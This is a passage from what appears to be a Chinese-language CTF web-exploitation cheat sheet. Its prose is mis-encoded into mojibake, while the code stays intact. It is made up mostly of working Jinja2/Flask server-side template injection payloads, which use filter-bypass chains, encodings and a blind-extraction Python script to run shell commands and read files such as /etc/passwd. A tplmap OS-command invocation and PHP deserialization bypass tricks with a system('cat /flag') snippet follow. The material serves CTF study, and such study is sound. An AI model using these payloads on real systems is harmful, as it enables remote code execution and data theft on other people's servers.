#### **å¤–éƒ¨å‚æ•°åˆ©ç”¨**ï¼ˆçˆ†ç ´ä¸‹æ ‡ï¼‰

`request.args`æˆ–`request.values`ã€‚

#### **åˆ—ç›®å½•**

å¤åˆ¶

```
{{{}|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)|attr(request.args.init)|attr(request.args.g)|attr(request.args.item)(request.args.mod)|attr(request.args.func)(request.args.cmd)|attr(request.args.re)()}}&param=__class__&mro=__base__&sub=__subclasses__&item=__getitem__&init=__init__&g=__globals__&mod=os&func=popen&cmd=ls&re=read
```

#### **è¯»æ–‡ä»¶**

å¤åˆ¶

```
{{{}|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(475)(request.args.file)|attr(request.args.re)()}}
  &param=__class__&mro=__base__&sub=__subclasses__&item=__getitem__&file=/etc/passwd&re=read
```

#### **æ•°å­—**

unicodeå­—ç¬¦ï¼š`ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—`ï¼Œ`ğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡`ï¼Œ`ï¼ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™`

#### **å¯¹è±¡å±‚é¢**

- set {}=None

  å…¶ä»–å¼•ç”¨ï¼š

  `{{% set config=None %}} => {{url_for.__globals__.current_app.config}}`

  `{{% set __builtins__=None %}} => {{[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__}}`

- del

  é‡è½½ï¼š `reload(__builtins__)`

- å…¶ä»–

  è·å¾—å¯¹åº”å‡½æ•°çš„ä¸Šä¸‹æ–‡å¸¸é‡ï¼š`func.__code__.co_consts`

#### **å…³é”®å­—**

- **base64ç¼–ç **

  `__getattribute__`ä½¿ç”¨å®ä¾‹è®¿é—®å±æ€§æ—¶ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ã€‚

  ä¾‹å¦‚è¢«è¿‡æ»¤æ‰`__class__`å…³é”®è¯ï¼š

  å¤åˆ¶

  ```
  {{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}
  ```

- **å­—ç¬¦ä¸²æ‹¼æ¥**

  å¤åˆ¶

  ```
  yyy.__init__.__globals__.__builtins__|attr('__getit''em__')('ev''al')('__imp''ort__("o''s").po''pen("ls /").re''ad()')
  [].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()
  [].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__["op"+"en"]("/fl"+"ag").read()
  ```

- **åè½¬**

  å¤åˆ¶

  ```
  {{cycler['__tini__'[::-1]]['__slabolg__'[::-1]].os.popen('id').read()}}
  ```

- **lower()**

  å¤åˆ¶

  ```
  {{sss.__init__.__globals__.__builtins__.open("/FLAG".lower()).read()}}
  ```

- **æ¸…ç©ºå…³é”®å­—list**

  å¤åˆ¶

  ```
  [å…³é”®å­—listå˜é‡å].clear()
  open("/flag").read()
  ```

- **16è¿›åˆ¶**

  å¤åˆ¶

  ```
  .__class__ => ["\x5f\x5fc\x6cass\x5f\x5f"]
  ```

- **8è¿›åˆ¶**

  å¤åˆ¶

  ```
  .__class__ => ["\137\137\143\154\141\163\163\137\137"]
  .__base__ => ["\137\137\142\141\163\145\137\137"]
  .__subclasses__ => ["\137\137\163\165\142\143\154\141\163\163\145\163\137\137"]
  .__init__ => ["\137\137\151\156\151\164\137\137"]
  .__globals__ => ["\137\137\147\154\157\142\141\154\163\137\137"]
  .__builtins__ => ["\137\137\142\165\151\154\164\151\156\163\137\137"]
  .__import__ => ["\137\137\151\155\160\157\162\164\137\137"]
  .popen => ["\160\157\160\145\156"]
  .read => ["\162\145\141\144"]
  ```

- **unicodeç¼–ç **

  å¤åˆ¶

  ```
  .__class__ => ["\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"]
  ```

- **unicodeå­—ç¬¦ / Non-ASCII Identifies**

  `ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğšğ›ğœğğğŸğ ğ¡ğ¢ğ£ğ¤ğ¥ğ¦ğ§ğ¨ğ©ğªğ«ğ¬ğ­ğ®ğ¯ğ°ğ±ğ²ğ³`

  `ğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡ğ•’ğ•“ğ•”ğ••ğ•–ğ•—ğ•˜ğ•™ğ•šğ•›ğ•œğ•ğ•ğ•Ÿğ• ğ•¡ğ•¢ğ•£ğ•¤ğ•¥ğ•¦ğ•§ğ•¨ğ•©ğ•ªğ•«`

  `ï¼ï¼‘ï¼’ï¼“ï¼”ï¼•ï¼–ï¼—ï¼˜ï¼™`

  å‚è€ƒï¼šhttps://www.compart.com/en/unicode/U+0030

- **atträ¸è¿‡æ»¤å™¨**

  å¦‚æœæ²¡æœ‰è¿‡æ»¤`globals`ï¼Œä»`globals`é‡ŒæŠŠ`eval`å‡½æ•°æ‰¾å‡ºæ¥ï¼Œç„¶åæ„é€ ä»»æ„å­—ç¬¦ä¸²æ”¾è¿›å»RCEå³å¯ã€‚

  å‚è€ƒï¼šhttps://www.gem-love.com/ctf/2598.html

  å¤åˆ¶

  ```
  {% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}  # _
  {% set spa = ((app.__doc__|list()).pop(102)|string())%}  #ç©ºæ ¼
  {% set pt = ((app.__doc__|list()).pop(320)|string())%}  #ç‚¹
  {% set yin = ((app.__doc__|list()).pop(337)|string())%}   #å•å¼•å·
  {% set left = ((app.__doc__|list()).pop(264)|string())%}   #å·¦æ‹¬å·(
  {% set right = ((app.__doc__|list()).pop(286)|string())%}   #å³æ‹¬å·)
  {% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}   #æ–œçº¿/
  {% set bu = dict(buil=aa,tins=dd)|join() %}  #builtins
  {% set im = dict(imp=aa,ort=dd)|join() %}  #import
  {% set sy = dict(po=aa,pen=dd)|join() %}  #popen
  {% set os = dict(o=aa,s=dd)|join() %}  #os
  {% set ca = dict(ca=aa,t=dd)|join() %}  #cat
  {% set flg = dict(fl=aa,ag=dd)|join() %}  #flag
  {% set ev = dict(ev=aa,al=dd)|join() %} #eval
  {% set red = dict(re=aa,ad=dd)|join()%}  #read
  {% set bul = xhx*2~bu~xhx*2 %}  #__builtins__
  
  #æ‹¼æ¥èµ·æ¥ __import__('os').popen('cat /flag').read()
  {% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} 
  
  
  {% for f,v in y1ng.__init__.__globals__.items() %} #globals
  	{% if f == bul %} 
  		{% for a,b in v.items() %}  #builtins
  			{% if a == ev %} #eval
  				{{b(pld)}} #eval(pld)
  			{% endif %}
  		{% endfor %}
  	{% endif %}
  {% endfor %}
  
  #payload
  #{%%20set%20xhx%20=%20(({%20}|select()|string()|list()).pop(24)|string())%}{%%20set%20spa%20=%20((app.__doc__|list()).pop(102)|string())%}{%%20set%20pt%20=%20((app.__doc__|list()).pop(320)|string())%}%20{%%20set%20yin%20=%20((app.__doc__|list()).pop(337)|string())%}{%%20set%20left%20=%20((app.__doc__|list()).pop(264)|string())%}%20{%%20set%20right%20=%20((app.__doc__|list()).pop(286)|string())%}%20{%%20set%20slas%20=%20(y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}%20{%%20set%20bu%20=%20dict(buil=aa,tins=dd)|join()%20%}{%%20set%20im%20=%20dict(imp=aa,ort=dd)|join()%20%}{%%20set%20sy%20=%20dict(po=aa,pen=dd)|join()%20%}{%%20set%20os%20=%20dict(o=aa,s=dd)|join()%20%}%20{%%20set%20ca%20=%20dict(ca=aa,t=dd)|join()%20%}{%%20set%20flg%20=%20dict(fl=aa,ag=dd)|join()%20%}{%%20set%20ev%20=%20dict(ev=aa,al=dd)|join()%20%}%20{%%20set%20red%20=%20dict(re=aa,ad=dd)|join()%}{%%20set%20bul%20=%20xhx*2~bu~xhx*2%20%}{%%20set%20pld%20=%20xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right%20%}%20{%%20for%20f,v%20in%20y1ng.__init__.__globals__.items()%20%}{%%20if%20f%20==%20bul%20%}{%%20for%20a,b%20in%20v.items()%20%}{%%20if%20a%20==%20ev%20%}{{b(pld)}}{%%20endif%20%}{%%20endfor%20%}{%%20endif%20%}{%%20endfor%20%}
  ```

  å¤åˆ¶

  ```
  {%set a=dict(po=x,p=x)|join%}  #pop
  {%set b=(()|select|string|list)|attr(a)(ğŸğŸ’)%}  #_
  {%set c=(b,b,dict(do=x,c=x)|join,b,b)|join()%}  #__doc__
  {%set d=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸ‘ğŸ•)%}  #å•å¼•å·
  {%set e=(x|attr(c)|list)|attr(a)(ğŸğŸ”ğŸ’)%}  #å·¦æ‹¬å·(
  {%set f=(x|attr(c)|list)|attr(a)(ğŸğŸ–ğŸ”)%}  #å³æ‹¬å·)
  {%set g=(x|attr(c)|list)|attr(a)(ğŸ‘ğŸğŸ)%}  #ç‚¹.
  {%set h=(x|attr(c)|list)|attr(a)(ğŸğŸğŸ)%}  #ç©ºæ ¼
  {%set i=(b,b,dict(in=x,it=x)|join,b,b)|join()%}  #__init__
  {%set j=(b,b,dict(glo=x,bals=x)|join,b,b)|join()%}  #__globals__
  {%set k=(b,b,dict(ge=x,titem=x)|join,b,b)|join()%}  #__getitem__
  {%set l=(b,b,dict(buil=x,tins=x)|join,b,b)|join()%}  #__builtins__
  {%set m=(b,b,dict(im=x,port=x)|join,b,b)|join()%}  #__import__
  {%set n=(x|attr(i)|attr(j)|string|list)|attr(a)(ğŸ‘ğŸ’ğŸ—)%}
  {%set o=dict(ev=x,al=x)|join()%}  #eval
  {%set p=dict(o=x,s=x)|join()%}  #os
  {%set q=dict(po=x,pen=x)|join()%}  #popen
  {%set r=dict(re=x,ad=x)|join()%}  #read
  {%set s=(dict(ls=x)|join,h,n,dict(var=x)|join,n,dict(www=x)|join,n,dict(flask=x)|join)|join()%}
  {%set t=(m,e,d,p,d,f,g,q,e,d,s,d,f,g,r,e,f)|join()%}
  {%set u=x|attr(i)|attr(j)|attr(k)(l)|attr(k)(o)(t)%}
  {{u}}
  ```

  å¤åˆ¶

  ```
  {% set id=dict(ind=a,ex=a)|join%}
  {% set pp=dict(po=a,p=a)|join%}
  {% set ls=dict(ls=a)|join%}
  {% set ppe=dict(po=a,pen=a)|join%}
  {% set gt=dict(ge=a,t=a)|join%}
  {% set cr=dict(ch=a,r=a)|join%}
  {% set nn=dict(n=a)|join%}
  {% set tt=dict(t=a)|join%}
  {% set ff=dict(f=a)|join%}
  {% set ooqq=dict(o=a,s=a)|join %}
  {% set rd=dict(re=a,ad=a)|join%}
  {% set five=(lipsum|string|list)|attr(id)(tt) %}
  {% set three=(lipsum|string|list)|attr(id)(nn) %}
  {% set one=(lipsum|string|list)|attr(id)(ff) %}
  {% set shiba=five*five-three-three-one %}
  {% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}
  {% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}
  {% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}
  {% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}
  {% set space=chcr(three*three*five-five-five-three) %}
  {% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}
  {{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}
  ```

- **æ— å›æ˜¾**

  å¤åˆ¶

  ```
  {{yyy.__init__.__globals__.__builtins__|attr('__getitem_')('eval')('__import__("time").sleep(3) if open("/app/flag.txt").read()[0]=="f" else 1')}}
  
  {%if session.update({'f':lipsum.__globals__.__os__.__popen__('id').read()})%}{%endif%}
  
  {%include session.update({'f':lipsum.__globals__.__os__.__popen__('id').read()})%}
  ```

  ç›²æ³¨ï¼š

  å¤åˆ¶

  ```
  import requests
  from string import printable as pt
  
  host = ''
  res  = ''
  
  for i in range(0,40):
      for c in pt:
          payload = '{{(request.__class__.__mro__[2].__subclasses__[334].__init__.__globals__["__builtins__"]["file"]("/etc/passwd").read()|string).index("%c",%d,%d)}}' % (c,i,i+1) 
          param = {
              "name":payload
          }
          req = requests.get(host,params=param)
  
          if req.status_code == 200:
              res += c
              break
      print(res)
  ```



#### è‡ªåŠ¨åŒ–å·¥å…·

**tplmap**: https://github.com/epinna/tplmap

```
/tplmap.py --os-cmd -u 'http://www.target.com/page?name=John'
```

#### å‚è€ƒæ–‡

[SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰](https://blog.csdn.net/miuzzx/article/details/110220425)

[SSTIæ¼æ´å­¦ä¹  (ä¸Š)â€”â€”åŸºç¡€çŸ¥è¯†å’Œä¸€äº›ä¸å¸¸è§çš„æ¨¡æ¿å¼•æ“ä»‹ç»](https://www.anquanke.com/post/id/246093)



#### Pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´

[Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)



#### Payloadå‚è€ƒ

[Server Side Template Injection](https://medium.com/server-side-template-injection/server-side-template-injection-faf88d0c7f34)

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)











## [4.ååºåˆ—åŒ–](https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

ååºåˆ—åŒ–

### ååºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æœ¯æ–¹æ³•

> 1. __construct()  #æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•
>    __destruct()  #æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…é”€æ¯æ—¶è°ƒç”¨ï¼ˆæ²¡æœ‰å˜é‡æŒ‡åˆ°å½“å‰å¯¹è±¡æ—¶ä¹Ÿä¼šè¢«è§¦å‘ï¼Œå¦‚ a:2:{i:0;O:4:"User":0:{}i:0;s:3:"xxx";}ï¼Œè¢«è¦†ç›–åæ²¡æœ‰å˜é‡æŒ‡å‘Userå¯¹è±¡ï¼‰
>    __toString()  #æŠŠç±»è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨
>    __wakeup()  #ä½¿ç”¨unserializeå‡½æ•°ï¼Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨
>    __sleep()  #ä½¿ç”¨serialize()å‡½æ•°ï¼Œåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨
>    __call()  #åœ¨å¯¹è±¡ä¸­ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è°ƒç”¨æƒé™ä¸è¶³æ—¶è°ƒç”¨
>    __callstatic()    #åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­ï¼Œè°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘
>    __get()  #è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨
>    __set()   #è®¾ç½®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨
>    __invoke()  #å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘
>    __autoload()  #å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»
>    __isset()   #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘
>    __unset()   #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘

### __wakeupç»•è¿‡

åŸç†ï¼š
å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeup çš„æ‰§è¡Œ
ç¤ºä¾‹ï¼š
`O:4:"Dino":***\*1\****:{s:1:"a";s:4:"misc";}`æ”¹ä¸º`O:4:"Dino":***\*2\****:{s:1:"a";s:4:"misc";}`

### protectedå’Œprivateç»•è¿‡

> å¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåˆ™æ˜¯\x00*\x00ç±»åçš„å½¢å¼
> å¦‚æœå˜é‡å‰æ˜¯privateï¼Œåˆ™æ˜¯\x00ç±»å\x00çš„å½¢å¼

> ç»•è¿‡ï¼š
> â‘ ï¼šphp7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿï¼Œå°†protectedæ”¹æˆpublic
> â‘¡ï¼šæ‰‹åŠ¨å°†åºåˆ—åŒ–åçš„å½¢å¼æ”¹ä¸ºprotectedæˆ–è€…privateçš„æ ‡å‡†å½¢å¼ï¼Œç»“åˆurlencodeå’Œbase64ç¼–ç è¿›è¡Œæ“ä½œ

ä¾‹å­å½¢å¼ï¼š

```php
<?php
class test{
    public $a ="r";
    private $b = "r";
    protected $c = "r";

}
$flag = new test();
echo serialize($flag);
?>
```

è¾“å‡º

```
O:4:"test":3:{s:1:"a";s:1:"r";s:7:"testb";s:1:"r";s:4:"*c";s:1:"r";}
```

åœ¨ç¼–è¯‘å™¨vsä¸­è¾“å‡ºå†…å®¹æ˜¾ç¤ºæ˜¯æ²¡æœ‰\x00ï¼ˆç©ºæ ¼ï¼‰ï¼›å¯èƒ½æ˜¯è¢«æ˜¾ç¤ºå¿½ç•¥äº†ï¼Œä½†å®ƒæ˜¯å­˜åœ¨ç©ºæ ¼çš„ï¼Œæ­£ç¡®å¦‚ä¸‹ï¼štestbæ˜¯privateå˜é‡ï¼Œåºåˆ—åŒ–æ ¼å¼ä¸ºâ€˜ test b'å…±7ä¸ªå­—ç¬¦ï¼›

```
O:4:"test":3:{s:1:"a";s:1:"r";s:7:" test b";s:1:"r";s:4:" * c";s:1:"r";}
```



æ¦‚å¿µï¼šåºåˆ—åŒ–å°±æ˜¯ä½¿ç”¨**serialize()**å°†å¯¹è±¡çš„ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼è¿›è¡Œè¡¨ç¤ºï¼Œååºåˆ—åŒ–æ˜¯ä½¿ç”¨**unserialize()**å°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ„é€ æˆç›¸åº”çš„å¯¹è±¡ï¼Œååºåˆ—åŒ–æ˜¯åºåˆ—åŒ–çš„é€†è¿‡ç¨‹ã€‚ åºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥æ˜¯**class**ä¹Ÿå¯ä»¥æ˜¯**Array,string**ç­‰å…¶ä»–å¯¹è±¡ã€‚

é—®é¢˜åŸå› ï¼šæ¼æ´çš„æ ¹æºåœ¨äº**unserialize()**å‡½æ•°çš„å‚æ•°å¯æ§ã€‚å¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸­å­˜åœ¨é­”æœ¯æ–¹æ³•ï¼Œè€Œä¸”é­”æœ¯æ–¹æ³•ä¸­çš„ä»£ç æˆ–å˜é‡ç”¨æˆ·å¯æ§ï¼Œå°±å¯èƒ½äº§ç”Ÿååºåˆ—åŒ–æ¼æ´ï¼Œæ ¹æ®ååºåˆ—åŒ–åä¸åŒçš„ä»£ç å¯ä»¥å¯¼è‡´å„ç§æ”»å‡»ï¼Œå¦‚ä»£ç æ³¨å…¥ã€SQLæ³¨å…¥ã€ç›®å½•éå†ç­‰ç­‰ã€‚



### åºåˆ—åŒ–æ ¼å¼

å¯¹è±¡ç±»å‹:å¯¹è±¡åé•¿åº¦:â€å¯¹è±¡åâ€:å¯¹è±¡æˆå‘˜å˜é‡ä¸ªæ•°:{å˜é‡1ç±»å‹:å˜é‡å1é•¿åº¦:å˜é‡å1; å‚æ•°1ç±»å‹:å‚æ•°1é•¿åº¦:å‚æ•°1; å˜é‡2ç±»å‹:å˜é‡å2é•¿åº¦:â€å˜é‡å2â€; å‚æ•°2ç±»å‹:å‚æ•°2é•¿åº¦:å‚æ•°2;â€¦ â€¦}

å¦‚ï¼š

O:6:â€Personâ€:2:{s:12:â€ Person nameâ€;s:8:â€Thinkingâ€;s:11:â€ Person sexâ€;s:3:â€manâ€;} a:2:{s:4:â€nameâ€;s:8:â€Thinkingâ€;s:3:â€sexâ€;s:3:â€manâ€;}

**å¯¹è±¡ç±»å‹ï¼š**Class-Oï¼ŒArray-aã€‚

**å˜é‡å’Œå‚æ•°ç±»å‹ï¼š**string-sï¼Œint-iï¼ŒArray-aï¼Œå¼•ç”¨-Rã€‚

**åºåˆ—ç¬¦å·ï¼š**å‚æ•°ä¸å˜é‡ä¹‹é—´ç”¨åˆ†å·(;)éš”å¼€ï¼ŒåŒä¸€å˜é‡å’ŒåŒä¸€å‚æ•°ä¹‹é—´çš„æ•°æ®ç”¨å†’å·(:)éš”å¼€ã€‚

|   ç±»å‹    |                             ç»“æ„                             |
| :-------: | :----------------------------------------------------------: |
|  String   |                        s:size:value;                         |
|  Integer  |                           i:value;                           |
|  Boolean  |                      b:value;(ä¿å­˜1æˆ–0)                      |
|   Null    |                              N;                              |
|   Array   | a:size:{key definition;value definition;(repeated per element)} |
|  Object   | O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} |
| Reference |                             R:2;                             |



### ä¸‰ç§è®¿é—®æ§åˆ¶çš„åŒºåˆ«

public: **å˜é‡å**

protected: **\x00 + \* + \x00 + å˜é‡å**ï¼ˆæˆ– **\00 + \* + \00 + å˜é‡å** æˆ– **%00 + \* + %00 + å˜é‡å**ï¼‰

private: **\x00 + ç±»å + \x00 + å˜é‡å**ï¼ˆæˆ– **\00 + ç±»å + \00 + å˜é‡å** æˆ– **%00 + ç±»å + %00 + å˜é‡å**ï¼‰

æ³¨ï¼š>=php v7.2 ååºåˆ—åŒ–å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿï¼ˆprotected -> publicï¼‰



### é­”æœ¯æ–¹æ³•

å¤åˆ¶

```
__construct()  #æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•
__destruct()  #æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…é”€æ¯æ—¶è°ƒç”¨ï¼ˆæ²¡æœ‰å˜é‡æŒ‡åˆ°å½“å‰å¯¹è±¡æ—¶ä¹Ÿä¼šè¢«è§¦å‘ï¼Œå¦‚ a:2:{i:0;O:4:"User":0:{}i:0;s:3:"xxx";}ï¼Œè¢«è¦†ç›–åæ²¡æœ‰å˜é‡æŒ‡å‘Userå¯¹è±¡ï¼‰
__toString()  #æŠŠç±»è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨
__wakeup()  #ä½¿ç”¨unserializeå‡½æ•°ï¼Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨
__sleep()  #ä½¿ç”¨serialize()å‡½æ•°ï¼Œåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨
__call()  #åœ¨å¯¹è±¡ä¸­ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è°ƒç”¨æƒé™ä¸è¶³æ—¶è°ƒç”¨
__callstatic()    #åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­ï¼Œè°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘
__get()  #è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨
__set()   #è®¾ç½®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨
__invoke()  #å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘
__autoload()  #å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»
__isset()   #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘
__unset()   #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘
```



### ç»•è¿‡æ–¹æ³•

- ##### __wakeup()å¤±æ•ˆ

  1. PHP5<5.6.25 æˆ– PHP7<7.0.10

     å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚

     å¦‚ï¼š`O:4:"Demo":2:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

  2. `Serialize` ç‰¹æ€§ï¼š`O` æ”¹ä¸º `C`

     [bypass __wakeup](https://bugs.php.net/bug.php?id=81151)

- ##### ç»•è¿‡preg_match()

  å¯ä½¿ç”¨`+`ï¼Œ`<`ç»•è¿‡æ­£åˆ™ï¼Œå¦‚ï¼š

  `O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

  `O:<4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}`

- ##### ç»•è¿‡å…³é”®å­—

  PHPåºåˆ—åŒ–ä¸­å­˜åœ¨åºåˆ—åŒ–ç±»å‹ `S`ï¼Œç›¸è¾ƒäºå°å†™çš„ `s`ï¼Œå¤§å†™ `S` æ˜¯escapedå­—ç¬¦ä¸²ï¼Œä¼šå°† `\xx` å½¢å¼ä½œä¸ºä¸€ä¸ª16è¿›åˆ¶å­—ç¬¦å¤„ç†ï¼Œå¦‚ï¼š

  `n` çš„åå…­è¿›åˆ¶æ˜¯ `6e`ï¼Œæ‰€ä»¥æŠŠ `name`æ›¿æ¢ä¸º `\6eame` å³å¯ç»•è¿‡ã€‚

- ##### ç»•è¿‡ throw new Exception

  - å»æ‰æœ€åçš„å¤§æ‹¬å·ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æŠ¥é”™æ¥é˜²æ­¢è¿›å…¥ Exception

  - GC

    `a:2:{i:0;O:7:"getflag":{}i:0;N;}`

    å› ä¸º**ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ**çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†`Array[0]`è®¾ç½®ä¸º`getflag`å¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†`Array[0]`è®¾ç½®ä¸º`null`ï¼Œè¿™æ ·å‰é¢çš„`getflag`å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œä¾¿å¯ä»¥æ‰§è¡Œ`__destruct`ã€‚

- ##### ç»•è¿‡ md5+sha1 éªŒè¯

  åˆ¤æ–­æ¡ä»¶ï¼š

  å¤åˆ¶

  ```
  if( ($this->var1 != $this->var2) && (md5($this->var1) === md5($this->var2)) && (sha1($this->var1) === sha1($this->var2)) ) {
      eval($this->var1);
  }
  ```

  ä¼ å…¥2ä¸ªä¸ç›¸ç­‰å¯¹è±¡ï¼Œä½†æ˜¯ä»–ä»¬çš„ `__toString` é­”æ³•å‡½æ•°è¿”å›çš„ä¸€æ ·ï¼Œå¯ä»¥ç»•è¿‡ ifï¼Œä¸”evalè½¬ä¸ºå­—ç¬¦ä¸²æ—¶æˆ‘ä»¬ä¹Ÿä½¿å…¶å¯ä»¥è¢«æ‰§è¡Œã€‚

  æŸ¥æ‰¾å¸¦ `__toString` çš„ç±»ï¼Œæ»¡è¶³çš„æœ‰ `Exception/ErrorException/Error/ParseError/mysqli_sql_exception` ç­‰ï¼Œä»¥ `Exception` ä¸ºä¾‹ï¼Œconstructå‡½æ•°ä¸ºï¼š

  `public function __construct($message = "", $code = 0, Throwable $previous = null)`

  å®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸ä¿¡æ¯ï¼Œå¯ä»¥æ§åˆ¶ä¼ å…¥ `message` å’Œ `code` çš„å€¼ä¸åŒå³å¯ã€‚

  å¤åˆ¶

  ```
  $cmd ='system("cat /flag");?>';
  $ex1 = new Exception($cmd);
  $ex2 = new Exception($cmd,1);
  ```

- ##### unserialize_callback_func + spl_autoload

